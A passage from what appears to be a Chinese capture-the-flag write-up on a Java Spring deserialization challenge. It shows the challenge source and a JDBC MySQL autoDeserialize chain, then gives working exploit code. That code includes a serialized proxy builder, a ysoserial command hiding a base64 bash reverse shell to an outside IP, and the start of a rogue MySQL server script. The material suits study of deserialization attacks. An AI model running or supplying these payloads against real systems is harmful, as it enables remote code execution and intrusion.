javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CookieValue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/index&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@CookieValue(value = &quot;data&quot;, required = false)</span> String cookieData)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cookieData != <span class="literal">null</span> &amp;&amp; !cookieData.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;redirect:/hello&quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@PostMapping(&#123;&quot;/index&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line">    userinfo.setUsername(username);</span><br><span class="line">    userinfo.setPassword(password);</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;data&quot;</span>, serialize(userinfo));</span><br><span class="line">    cookie.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@CookieValue(value = &quot;data&quot;, required = false)</span> String cookieData, Model model)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cookieData == <span class="literal">null</span> || cookieData.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;redirect:/index&quot;</span>; </span><br><span class="line">    <span class="type">Info</span> <span class="variable">info</span> <span class="operator">=</span> (Info)deserialize(cookieData);</span><br><span class="line">    <span class="keyword">if</span> (info != <span class="literal">null</span>)</span><br><span class="line">      model.addAttribute(<span class="string">&quot;info&quot;</span>, info.getAllInfo()); </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">      oos.writeObject(obj);</span><br><span class="line">      oos.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(bais, <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      obj = serialKiller.readObject();</span><br><span class="line">      serialKiller.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>InfoInvocationHandler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.invocation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InfoInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">  <span class="keyword">private</span> Info info;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">InfoInvocationHandler</span><span class="params">(Info info)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.info = info;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>) &amp;&amp; </span><br><span class="line">        !<span class="built_in">this</span>.info.checkAllInfo().booleanValue())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">      <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.info, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>DatabaseInfo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseInfo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Info &#123;</span><br><span class="line">  <span class="keyword">private</span> String host;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String port;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String username;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> Connection connection;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHost</span><span class="params">(String host)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.host = host;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPort</span><span class="params">(String port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.username = username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.password = password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getHost</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.host;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPort</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.port;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.connection == <span class="literal">null</span>)</span><br><span class="line">      connect(); </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.connection;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://&quot;</span> + <span class="built_in">this</span>.host + <span class="string">&quot;:&quot;</span> + <span class="built_in">this</span>.port + <span class="string">&quot;/jdbc?user=&quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;&amp;password=&quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.connection = DriverManager.getConnection(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.host == <span class="literal">null</span> || <span class="built_in">this</span>.port == <span class="literal">null</span> || <span class="built_in">this</span>.username == <span class="literal">null</span> || <span class="built_in">this</span>.password == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> Boolean.valueOf(<span class="literal">false</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.connection == <span class="literal">null</span>)</span><br><span class="line">      connect(); </span><br><span class="line">    <span class="keyword">return</span> Boolean.valueOf(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Here is the configuration of database, host is &quot;</span> + <span class="built_in">this</span>.host + <span class="string">&quot;, port is &quot;</span> + <span class="built_in">this</span>.port + <span class="string">&quot;, username is &quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;, password is &quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Info.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">  Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span>;</span><br><span class="line">  </span><br><span class="line">  String <span class="title function_">getAllInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>UserInfo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Info &#123;</span><br><span class="line">  <span class="keyword">private</span> String username;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String password;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.username = username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.password = password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Boolean.valueOf((<span class="built_in">this</span>.username != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.password != <span class="literal">null</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getAllInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Your username is &quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;, and your password is &quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共就上述这几个文件组成   那么我们就可以开始分析(<strong>先导入到idea里</strong>)</p><p>这里的话先看反序列化入口</p><p><img src="../images/image-20230526150141923.png" alt="image-20230526150141923"></p><p>这里话就是会将cookie的值来进行反序列化</p><p>但是之前我们虽然看到了有<code>cc3.2.1</code>链子的依赖，但是，没啥用，因为这里的</p><p><code>serialkiller.conf</code>里面存在白名单  </p><p><img src="../images/image-20230526150417284.png" alt="image-20230526150417284"></p><p><strong>只允许gdufs和java.lang的类进行反序列化</strong></p><p>所以cc链直接打就不行了</p><p>于是我们就想别的方法  <strong>入口点在他自己写的一个代理类上面</strong></p><p><img src="../images/image-20230526150655974.png" alt="image-20230526150655974"></p><p>我们在调用他的<code>invoke</code>方法的时候，他会调用到<code>checkAllInfo()</code>方法  并且<code>info</code>可控</p><p>于是我们去看看哪个类里边存在<code>checkAllInfo()</code>方法</p><p><img src="../images/image-20230526150925311.png" alt="image-20230526150925311"></p><p>在<code>DatabaseInfo</code>这个类里边存在这个方法，并且最后还调用了自身的<code>connect()</code>方法</p><p>于是我们跟进这个<code>connect()</code>方法</p><p><img src="../images/image-20230526151040859.png" alt="image-20230526151040859"></p><p>发现了他存在<code>jdbc mysql</code>的恶意利用，这里就可以进行恶意代码执行了</p><p>由于我们前面查看的mysql连接器的版本是<code>8.0.19</code></p><p>于是就找了payload</p><p><img src="../images/image-20230526151250799.png" alt="image-20230526151250799"></p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InfoInvocationHandler.invoke()</span><br><span class="line"> -&gt;DatabaseInfo.checkAllInfo()</span><br><span class="line">   -&gt;DatabaseInfo.connect()</span><br></pre></td></tr></table></figure><p><strong>所以大致攻击流程为：</strong><br>cookie反序列化-&gt;反序列化出来的对象走invoke方法-&gt;向vps发jdbc请求-&gt;vps发恶意包-&gt;弹shell</p><p>那么接下来就开始编写EXP</p><p><strong>Myexp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web.model;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.*;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * databaseinfo * */</span></span><br><span class="line">        DatabaseInfo databaseinfo=<span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseinfo.setHost(<span class="string">&quot;101.42.39.110&quot;</span>);</span><br><span class="line">        databaseinfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseinfo.setUsername(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        databaseinfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * infoInvocationHandler * */</span></span><br><span class="line">        InfoInvocationHandler infoInvocationHandler=<span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseinfo);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * info */</span></span><br><span class="line">        Info info=(Info)Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 接下来按照源代码序列化的info用base64打出来</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(info);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        String str=<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用ysoserial工具生成一个payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwMS40Mi4zOS4xMTAvMzM4OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure><p>这里的生成文件名不能进行修改，因为得和等会部署的mysql恶意服务端里的文件相对应(<strong>这里用cc6是因为给的cc依赖是3.2.1</strong>)</p><p><strong>mysql.py </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span 